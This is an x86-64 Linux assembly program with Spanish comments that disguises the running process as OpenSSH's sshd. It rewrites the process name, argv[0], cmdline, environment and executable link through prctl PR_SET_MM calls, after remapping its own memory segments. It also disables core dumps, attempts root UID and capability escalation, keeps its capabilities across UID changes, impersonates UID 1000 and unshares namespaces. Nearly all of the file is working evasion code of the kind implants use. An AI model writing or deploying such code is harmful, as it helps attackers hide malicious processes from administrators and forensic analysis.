segment .data

    mimic_name db 'sshd',0
    mimic_argv db './sshd',0
    mimic_exe db '/usr/sbin/sshd',0
    mimic_cmdline db '/usr/sbin/sshd',0,'-D',0,'-oCiphers=aes256-gcm@openssh.com',0,'-oMACs=hmac-sha2-256',0,'-f',0,'/etc/ssh/sshd_config',0
    mimic_cmdline_length equ $ - mimic_cmdline
    mimic_environ db 'LANG=en_US.UTF-8',0,'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',0,'NOTIFY_SOCKET=/run/systemd/notify',0,'INVOCATION_ID=a1b2c3d4e5f6',0
    mimic_environ_length equ $ - mimic_environ
    
    ; struct timespec
    timespec:
        dq 120   ; segundos (>= 0)  
        dq 0    ; nanosegundos [0, 999999999]

    ; struct __user_cap_header_struct
    hdrp:
        dd 0x20080522   ; versión del protocolo de capabilities (0x20080522 = _LINUX_CAPABILITY_VERSION_3)
        dd 0            ; PID o TID del objetivo (0 = hilo actual)

segment .bss
    phdr_value resq 1
    phent_value resq 1
    phnum_value resq 1
    ; struct elf64_phdr, cada entrada tiene 56 bytes
        ; typedef struct elf64_phdr {
            ; Elf64_Word  p_type;     /* Tipo de segment                         */
            ; Elf64_Word  p_flags;    /* Flags de permisos (RWX)                 */
            ; Elf64_Off   p_offset;   /* Offset del segment en el archivo        */
            ; Elf64_Addr  p_vaddr;    /* Dirección virtual de carga              */
            ; Elf64_Addr  p_paddr;    /* Dirección física (sin uso en Linux)     */
            ; Elf64_Xword p_filesz;   /* Tamaño del segment en el archivo        */
            ; Elf64_Xword p_memsz;    /* Tamaño del segment en memoria           */
            ; Elf64_Xword p_align;    /* Alineamiento del segment                */
        ; } Elf64_Phdr;

    elf64_phdr:
        p_type resd 1
        p_flags resd 1
        p_offset resq 1
        p_vaddr resq 1
        p_paddr resq 1
        p_filesz resq 1
        p_memsz resq 1
        p_align resq 1



    ;UID   (real)            GID   (real)
    ;EUID  (effective)       EGID  (effective)
    ;SUID  (saved set-uid)   SGID  (saved set-gid)


    ruid_val resd 1   ; Valor de Real UID (4 bytes)
    euid_val resd 1   ; Valor de Effective UID  (4 bytes)
    suid_val resd 1   ; Valor de Save Set-User-ID  (4 bytes)

    rgid_val resd 1   ; Valor de Real GID (4 bytes)
    egid_val resd 1   ; Valor de Effective GID  (4 bytes)
    sgid_val resd 1   ; Valor de Saved Set-GID  (4 bytes)

    datap resb 24     ; array de dos estructuras __user_cap_data_struct contiguas en memoria (12 bytes cada una)

    tmp_mm_addr resq 1

tmp_bss:                                 
    
    headers_segment_privs resd 1
    headers_segment_start resq 1
    headers_segment_end resq 1
    data_segment_privs resd 1
    data_segment_start resq 1
    data_segment_end resq 1
    text_segment_privs resd 1
    text_segment_start resq 1
    text_segment_end resq 1
    return_addr resq 1

tmp_bss_len equ $ - tmp_bss

segment .text
global _start

_start:

; ================================================

; --------------------------------------------------------------------------
; OBTENCIÓN DEL RANGO DE DIRECCIONES VIRTUALES DE LOS SEGMENTOS DEL BINARIO
; --------------------------------------------------------------------------

; [ parte alta ]
; +----------------------------------+
; | cadenas de argv, envp, filename  |  bytes terminados en NULL
; +----------------------------------+
; | padding de alineamiento (16 B)   |
; +----------------------------------+
; | AT_NULL  (0x00, 0x00)            |  terminador del auxv
; | ...                              |
; | AT_ENTRY (0x09, dirección)       |  16 bytes por entrada
; | AT_PHNUM (0x05, valor)           |
; | AT_PHENT (0x04, valor)           |
; | AT_PHDR  (0x03, dirección)       |  inicio del auxv
; +----------------------------------+
; | NULL                             |  8 bytes: terminador de envp[]
; | envp[n-1]  (puntero)             |
; | ...                              |
; | envp[0]    (puntero)             |
; +----------------------------------+
; | NULL                             |  8 bytes: terminador de argv[]
; | argv[argc-1] (puntero)           |
; | ...                              |
; | argv[0]      (puntero)           |
; +----------------------------------+
; | argc                             |  8 bytes (unsigned long)
; +----------------------------------+
;  ↑ RSP apunta aquí en el entry point

; ==================================================

    mov r15, rsp ; Tope de la pila inicial
    add r15, 8   ; Saltamos argc (argc = 8 bytes)

; ==================================================
 
 ; Ahora debemos iterar hasta completar argv[]
argv_loop:
    cmp qword [r15], 0
    je envp_loop
    add r15, 8
    jmp argv_loop

 ; Ahora debemos iterar hasta completar envp[]

envp_loop:
    add r15, 8         ; Saltamos en NULL Terminator de argv[]
    cmp qword [r15], 0
    jne envp_loop

    add r15, 8         ; Saltamos en NULL Terminator de envp[]

 ; Ahora debemos iterar sobre el auxv (cada entrada tiene 16 bytes)

auxv_loop:
    
    mov r13, [r15]    ; Clave
    add r15, 8
    mov r14, [r15]    ; Valor
    add r15, 8
    cmp qword [r15], 0    ; El terminator es cuando la clave es AT_NULL (0x00, 0x00), ninguna otra clave se identifica por NULL
    jne auxv_par
    xor r15, r15
    xor rax, rax
    jmp pht_entry

auxv_par:

    cmp r13, 3                  ; AT_PHDR
    je phdr_entry
    cmp r13, 4                  ; AT_PHENT 
    je phent_entry
    cmp r13, 5                  ; AT_PHNUM
    je phnum_entry
    jmp auxv_loop

phdr_entry:
    mov [rel phdr_value], r14
    jmp auxv_loop
phent_entry:
    mov [rel phent_value], r14
    jmp auxv_loop
phnum_entry:
    mov [rel phnum_value], r14
    jmp auxv_loop
pht_entry:

    cmp qword [rel phnum_value], 0
    je mime
    mov rsi, [rel phdr_value]
    lea rdi, [rel elf64_phdr]
    mov rcx, [rel phent_value]
    mov rax, [rel phent_value]    
    imul rax, r15 
    add rsi, rax                  
    cld
    rep movsb
    dec qword [rel phnum_value]
    inc r15

    cmp dword [rel p_type], 1        ; PT_LOAD
    jne pht_entry
    call check_headers_segment
    call check_data_segment
    call check_text_segment
    jmp pht_entry

; ===================================================================

mime:
    xor r12,r12
    xor r13, r13
    xor r14, r14
    xor r15, r15

; Obtención de UIDS y GIDS

    ; GETRESUID
    mov rax, 118
    lea rdi, [rel ruid_val]
    lea rsi, [rel euid_val]
    lea rdx, [rel suid_val]
    syscall
    cmp rax, 0
    jne exit

    ; GETRESGID
    mov rax, 120
    lea rdi, [rel rgid_val]
    lea rsi, [rel egid_val]
    lea rdx, [rel sgid_val]
    syscall
    cmp rax, 0
    jne exit
    

; -----------------
; ESCALADA DE UIDS
; -----------------

; 1 - Comprobamos si RUID = 0

    mov r12d, [rel ruid_val]  ; mov a r12d (zero-extends automáticamente a r12)
    cmp r12d, 0
    je user_escalation     ; Si RUID = 0, SETRESUID(0,0,0)

; 2 - Comprobamos si EUID = 0

    mov r13d, [rel euid_val]  
    cmp r13d, 0
    je user_escalation     ; Si EUID = 0, SETRESUID(0,0,0)


; 3 - Comprobamos si Saved Set Use ID = 0

    mov r14d, [rel suid_val] 
    cmp r14d, 0
    je user_escalation     ; Si Saved Set Use ID = 0, SETRESUID(0,0,0)
    
    
    jmp caps_escalation   ; Si RUID != 0  &&  EUID != 0  && Saved Set Use ID != 0, pasamos a la fase de escalada de capabilities


user_escalation:

; SETRESUID      
    mov rax, 117
    mov rdi, 0   ; Se puede hacer ->  xor rdi, rdi
    mov rsi, 0
    mov rdx, 0
    syscall
    cmp rax, 0
    jne exit

; ===================================================================

; -------------------------
; ESCALADA DE CAPABILITIES
; -------------------------

caps_escalation:


    ; 1 - Obtenemos todas las capabilities disponibles en el set Permitted

    ; CAPGET
    mov rax, 125
    lea rdi, [rel hdrp]
    lea rsi, [rel datap]
    syscall

;                ┌──────────────────────────────────────┐
;                │ datap[0].effective     (caps 0–31)   │ offset +0  
;                │ datap[0].permitted     (caps 0–31)   │ offset +4  
;                │ datap[0].inheritable   (caps 0–31)   │ offset +8
;                ├──────────────────────────────────────┤
;                │ datap[1].effective     (caps 32–63)  │ offset +12 
;                │ datap[1].permitted     (caps 32–63)  │ offset +16
;                │ datap[1].inheritable   (caps 32–63)  │ offset +20
;                └──────────────────────────────────────┘
;                             Total: 24 bytes

    xor r12, r12
    xor r13, r13

    ; Parte baja de las capabilities
    mov r12d, [rel datap+4]    ; datap[0].permitted    (offset + 4)
    ; Parte alta de las capabilities
    mov r13d, [rel datap+16]    ; datap[1].permitted    (offset + 16)


    ; 2 - Se copian las capabilities 0-31 del Permitted set en el Effective set y el el Inheritable set
    mov [rel datap], r12d
    mov [rel datap+8], r12d

    ; 3 - Se copian las capabilities 32-63 del Permitted set en el Effective set y el el Inheritable set
    mov [rel datap+12], r13d
    mov [rel datap+20], r13d

    ; 4 - Se establecen los cambios en las capabilities
    ; CAPSET
    mov rax, 126
    lea rdi, [rel hdrp]
    lea rsi, [rel datap]
    syscall

; ===================================================================

; -------------------------
; SE MODIFICA COMM
; -------------------------

    ; 1 - Cambiamos el valor de COMM (task_struct->comm)

    ;PRCTL
        ;PR_SET_NAME
        mov rax, 157
        mov rdi, 15
        lea rsi, [rel mimic_name]
        xor rdx, rdx
        xor r10, r10
        xor r8, r8
        syscall


; -------------------------
; SE MODIFICA ARGV[0]
; -------------------------

    xor r12, r12
    xor r13, r13

    ; 1 - Cambiamos el valor de argv[0]

    ; Direcciones altas
    ; ├── argv strings      ← las cadenas de arg ("./prog\0", "arg1\0", ...)
    ; ├── envp strings      ← las cadenas de entorno ("PATH=...\0", ...)
    ; ├── padding/alineación
    ; ├── auxv              ← auxiliary vector (AT_PHDR, AT_ENTRY, etc.)
    ; ├── NULL              ← fin de envp
    ; ├── envp[n]           ← punteros a las strings de entorno
    ; ├── envp[0]
    ; ├── NULL              ← fin de argv
    ; ├── argv[n]           ← punteros a las strings de argv
    ; ├── argv[0]           ← [rsp+8]  (puntero a la string)
    ; ├── argc              ← [rsp]
    ;Direcciones bajas (stack crece hacia abajo)

    mov r12, [rsp+8]                   ; r12 = dirección en el stack de la cadena original de argv[0] 
    mov r13, [rel mimic_argv]          ; r13 = contenido de la cadena de reemplazo
    mov [r12], r13                     ; Sobreescribimos la cadena original por la cadena de reemplazo


; ------------------------------------------
; SE ESTABLECE EL PROCESO COMO NO DUMPABLE
; ------------------------------------------

    ; 1 - Establece el proceso como NO dumpable

    ;PRCTL
        ;PR_SET_DUMPABLE
        mov rax, 157
        mov rdi, 4
        mov rsi, 0   ; 0 = el proceso no es dumpable
        xor rdx, rdx
        xor r10, r10
        xor r8, r8
        syscall


; ------------------------------------------
; MM Descriptor Spoofing
; ------------------------------------------
; Cambio de la identidad a nivel de kernel

    xor r14, r14
    mov r14d, [rel datap]

    ; CAP_SYS_RESOURCE = bit 24    
    ; Si el bit en la posición 24 está a 1, CAP_SYS_RESOURCE en el effective set
    bt r14d, 24              ; Si el bit en la posición 24 está a 1, CF = 1
                             ; Si el bit en la posición 24 está a 0, CF = 0              
    jnc caps_ret


tmp_mm:
    ; Reserva de la página de memoria MAP_PRIVATE | MAP_ANONYMOUS
        ;MMAP
        mov rax, 9
        mov rdi, 0
        mov rsi, 4096
        mov rdx, 0x3    ; READ && WRITE
        mov r10, 0x22   ; MAP_PRIVATE | MAP_ANONYMOUS
        mov r8, -1
        xor r9, r9
        syscall

        mov rbx, rax
        mov [rel tmp_mm_addr], rax

        lea rsi, [rel mm_start]
        mov rdi, rbx
        mov rcx, mm_end - mm_start
        cld 
        rep movsb


        lea r12, [rel un_tmp_mm]
        mov [rel return_addr], r12


        mov r12, rbx
        add r12, 4096
        sub r12, tmp_bss_len                 ; Tamaño de tmp_data
        lea rsi, [rel tmp_bss]
        mov rdi, r12
        mov rcx, tmp_bss_len
        cld 
        rep movsb

    ; Establecer los permisos
        ; MPROTECT
        mov rax, 10
        mov rdi, rbx
        mov rsi, 4096
        mov rdx, 0x5      ; READ && EXEC
        syscall

        jmp rbx

un_tmp_mm:
        ; MUNMAP
        mov rax, 11
        mov rdi, [rel tmp_mm_addr]
        mov rsi, 4096
        syscall

mm_spoof:
    ; Cambio de la línea de comandos con la que fue lanzado un proceso (cmdline)
    ; PRCTL
        ; PR_SET_MM_ARG_START
        mov rax, 157
        mov rdi, 35
        mov rsi, 8
        lea rdx, [rel mimic_cmdline]
        xor r10, r10
        xor r8, r8
        syscall
        ; PR_SET_MM_ARG_END
        mov rax, 157
        mov rdi, 35
        mov rsi, 9
        lea rdx, [rel mimic_cmdline + mimic_cmdline_length]
        xor r10, r10
        xor r8, r8
        syscall

; Cambio del conjunto de variables de entorno asociadas a un proceso (environ)

    ; PRCTL
        ; PR_SET_MM_ENV_START
        mov rax, 157
        mov rdi, 35
        mov rsi, 10
        lea rdx, [rel mimic_environ]
        xor r10, r10
        xor r8, r8
        syscall
        ; PR_SET_MM_ENV_END
        mov rax, 157
        mov rdi, 35
        mov rsi, 11
        lea rdx, [rel mimic_environ + mimic_environ_length]
        xor r10, r10
        xor r8, r8
        syscall

; Reemplazo del puntero exe_file en mm_struct para que apunte a un binario distinto
    ; OPENAT
    mov rax, 257
    mov rdi, -100    ; AT_FDCWD = -100
    lea rsi, [rel mimic_exe]
    xor rdx, rdx     ; O_RDONLY = 0x0
    xor r10, r10
    syscall

    ; RAX contiene el FD del fichero ejecutable
    mov r14, rax
    ; PRCTL
        ; PR_SET_MM_EXE_FILE
        mov rax, 157
        mov rdi, 35
        mov rsi, 13
        mov rdx, r14
        xor r10, r10
        xor r8, r8
        syscall



;-----------------------------------------------------
; Retención de Capabilities en caso de cambio de UIDs
; ----------------------------------------------------

caps_ret:

    xor r14, r14
    mov r14d, [rel datap]

    ; CAP_SETPCAP = bit 8    
    ; Si el bit en la posición 8 está a 1, CAP_SETPCAP en el effective set
    bt r14d, 8              ; Si el bit en la posición 8 está a 1, CF = 1
                            ; Si el bit en la posición 8 está a 0, CF = 0              
    jc setpcap_effective

    ; Mantenemos las capabilities (permitted set) en caso de cambio de UIDs (sin la capability CAP_SETPCAP)
    ; El inheritable set sobrevive siempre a las transiciones de UID, con o sin PR_SET_KEEPCAPS

    ; PRCTL
        ; PR_SET_KEEPCAPS
        mov rax, 157
        mov rdi, 8
        mov rsi, 1     ; 1 = Los conjuntos effective y ambient se borran (PR_SET_KEEPCAPS solo protege el permitted set) al cambiar de UIDs
        xor rdx, rdx
        xor r10, r10
        xor r8, r8
        syscall 
        jmp user_degrade

setpcap_effective:
    
    ; Mantenemos las capabilities en caso de cambio de UIDs (con la capability CAP_SETPCAP)

    ; PRCTL
        ; PR_SET_SECUREBITS
        mov rax, 157
        mov rdi, 28
        mov rsi, 12
        xor rdx, rdx
        xor r10, r10
        xor r8, r8
        syscall

    ; SECBIT_NO_SETUID_FIXUP + SECBIT_NO_SETUID_FIXUP_LOCKED (se mantienen todos los set de capabilities al cambiar de UIDS)
    ; A diferencia de KEEP_CAPS, no se borran los conjuntos en execve


; ===================================================================
; -------------------------
; DESESCALADA DE UIDS
; -------------------------

user_degrade:

    ; Degradamos los UIDS manteniendo las capabilities
    
    ; Se comprueba si disponemos de CAP_SETUID (permite cambiar los uids libremente)
    xor r14, r14
    mov r14d, [rel datap]

    ; CAP_SETUID = bit 7    
    ; Si el bit en la posición 7 está a 1, CAP_SETUID en el effective set
    bt r14d, 7              ; Si el bit en la posición 7 está a 1, CF = 1
                            ; Si el bit en la posición 7 está a 0, CF = 0              
    jc user_impersonate

    ;  Pasamos a tener los valores de UIDS iniciales
    ; SETRESUID
    mov rax, 117
    mov edi, [rel ruid_val]
    mov esi, [rel euid_val]
    mov edx, [rel suid_val]
    syscall
    cmp rax, 0
    je capabilities_degrade
    jmp exit

user_impersonate:
    
    ; Pasamos tener los valores de UIDS del primer usuario no-root creado en el sistema
    ; SETRESUID
    mov rax, 117
    mov rdi, 1000
    mov rsi, 1000
    mov rdx, 1000
    syscall

; -------------------------
; DESESCALADA DE GIDS
; -------------------------

group_degrade:
    ; Se comprueba si disponemos de CAP_SETGID (permite cambiar los gids libremente)
    xor r14, r14
    mov r14d, [rel datap]

    ; CAP_SETGID = bit 6    
    ; Si el bit en la posición 6 está a 1, CAP_SETGID en el effective set
    bt r14d, 6              ; Si el bit en la posición 6 está a 1, CF = 1
                            ; Si el bit en la posición 6 está a 0, CF = 0              
    jc group_impersonate
    ;  Pasamos a tener los valores de GIDS iniciales
    ; SETRESGID
        mov rax, 119
        mov rdi, [rel rgid_val]
        mov rsi, [rel egid_val]
        mov rdx, [rel sgid_val]
        syscall
        cmp rax, 0
        je capabilities_degrade
        jmp exit

group_impersonate: 
    ; SETRESGID
    mov rax, 119
    mov rdi, 1000
    mov rsi, 1000
    mov rdx, 1000
    syscall



; ===================================================================

; -------------------------
; DESESCALADA DE CAPABILITIES
; -------------------------

capabilities_degrade:

    xor r14, r14

    ; Borramos el Effective set
    mov [rel datap], r14d        ; effective low
    mov [rel datap + 12], r14d   ; effective high

    ; Borramos el Inheritable set
    mov [rel datap + 8], r14d        ; inheritable low
    mov [rel datap + 20], r14d       ; inheritable high

    ; CAPSET
    mov rax, 126
    lea rdi, [rel hdrp]
    lea rsi, [rel datap]
    syscall


; ------------------------------------------
; MODIFICACIÓN DE NAMESPACES
; ------------------------------------------

    ; UNSHARE
    mov rax, 272
    mov rdi, 0x78000000  ; CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWIPC
    syscall

exit:
    
    
    ; NANOSLEEP
    mov rax, 35
    lea rdi, [rel timespec]
    xor rsi, rsi
    syscall

    ; EXIT
    mov rax, 60
    xor rdi, rdi 
    syscall



check_headers_segment:
    cmp dword [rel p_flags], 4       ; PF_R
    jne .skip
    mov r12, [rel p_vaddr]
    mov [rel headers_segment_start], r12
    add r12, [rel p_memsz]
    ; n = p_align (0x1000)  ->  round up = (addr + (n - 1)) & ~(n - 1)
    ;                       ->  round down = addr & ~(n - 1)
    mov r13, [rel p_align]
    dec r13                  ; n - 1
    add r12, r13             ; addr + (n - 1)
    not r13                  ; ~(n - 1)
    and r12,r13              ; truncar
    mov [rel headers_segment_end], r12
    mov dword [rel headers_segment_privs], 1 ; inmediato (PROT_READ = 1)
.skip:
    ret

check_data_segment:
    cmp dword [rel p_flags], 6       ; PF_R | PF_W
    jne .skip
    mov r12, [rel p_vaddr]
    mov [rel data_segment_start], r12
    add r12, [rel p_memsz]
    ; n = p_align (0x1000)  ->  round up = (addr + (n - 1)) & ~(n - 1)
    ;                       ->  round down = addr & ~(n - 1)    
    mov r13, [rel p_align]
    dec r13                  ; n - 1
    add r12, r13             ; addr + (n - 1)
    not r13                  ; ~(n - 1)
    and r12,r13              ; truncar
    mov [rel data_segment_end], r12
    mov dword [rel data_segment_privs], 3 ; inmediato (PROT_READ = 1,PROT_WRITE = 2)
.skip:
    ret

check_text_segment:
    cmp dword [rel p_flags], 5       ; PF_R | PF_X
    jne .skip
    mov r12, [rel p_vaddr]
    mov [rel text_segment_start], r12
    add r12, [rel p_memsz]
    ; n = p_align (0x1000)  ->  round up = (addr + (n - 1)) & ~(n - 1)
    ;                       ->  round down = addr & ~(n - 1)    
    mov r13, [rel p_align]
    dec r13                  ; n - 1
    add r12, r13             ; addr + (n - 1)
    not r13                  ; ~(n - 1)
    and r12,r13              ; truncar
    mov [rel text_segment_end], r12
    mov dword [rel text_segment_privs], 5 ; inmediato (PROT_READ = 1,PROT_EXEC = 4)
.skip:
    ret


    ;          R12 -> Dirección de inicio de los datos en bss
    ;          R13 -> Permisos del segmento
    ; Entrada: R14 -> Dirección de inicio del segmento
    ;          R15 -> Dirección final del segmento

    
    ; headers_segment_privs resd 1
    ; headers_segment_start resq 1
    ; headers_segment_end resq 1
    ; data_segment_privs resd 1
    ; data_segment_start resq 1
    ; data_segment_end resq 1
    ; text_segment_privs resd 1
    ; text_segment_start resq 1
    ; text_segment_end resq 1
    ; return_addr resq 1

mm_start:
        mov r13d, [r12]
        add r12, 4
        mov r14, [r12]
        add r12, 8
        mov r15, [r12]
        add r12, 8
        call mm
        mov r13d, [r12]
        add r12, 4
        mov r14, [r12]
        add r12, 8
        mov r15, [r12]
        add r12, 8
        call mm
        mov r13d, [r12]
        add r12, 4
        mov r14, [r12]
        add r12, 8
        mov r15, [r12]
        add r12, 8
        call mm
        jmp [r12]
mm:
    
        sub r15,r14 ; Tamaño del segmento

    ; Reserva de la página de memoria MAP_PRIVATE | MAP_ANONYMOUS
        ;MMAP
        mov rax, 9
        mov rdi, 0
        mov rsi, r15
        mov rdx, 0x3    ; READ && WRITE
        mov r10, 0x22   ; MAP_PRIVATE | MAP_ANONYMOUS
        mov r8, -1
        xor r9, r9
        syscall

        mov rbx, rax

    ; Copia todos los bytes del segmento en la región de memoria recién reservada
        mov rsi, r14
        mov rdi, rbx
        mov rcx, r15
        cld 
        rep movsb

    ; Desmapear el segmento original
        ; MUNMAP
        mov rax, 11
        mov rdi, r14
        mov rsi, r15
        syscall

    ; Desplazar el mapping creado al rango del segmento original
        ; MREMAP
        mov rax, 25
        mov rdi, rbx
        mov rsi, r15
        mov rdx, r15
        mov r10, 0x3            ; MREMAP_MAYMOVE | MREMAP_FIXED 
        mov r8, r14
        syscall

    ; Establecer los permisos del segmento original
        ; MPROTECT
        mov rax, 10
        mov rdi, r14
        mov rsi, r15
        movzx rdx, r13d
        syscall

    ret 

    mm_end:
